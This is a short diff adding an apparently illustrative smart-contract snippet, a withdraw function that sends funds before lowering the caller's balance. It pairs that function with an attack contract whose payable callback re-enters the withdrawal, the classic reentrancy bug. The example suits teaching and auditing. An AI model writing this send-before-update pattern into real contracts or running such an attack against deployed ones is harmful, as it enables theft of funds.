@@ -1,0 +1,12 @@
+mutating func withdrawMoney(amount: Int) {
+  if balance[caller] < amount {
+    fatalError()
+  }
+  call(value: Wei(amount))! caller.sendMoney()
+  balance[caller] -= amount
+}
+
+// in an attack contract:
+@payable func sendMoney(implicit value: Wei) {
+  call! bank.withdrawMoney(amount: 100)
+}
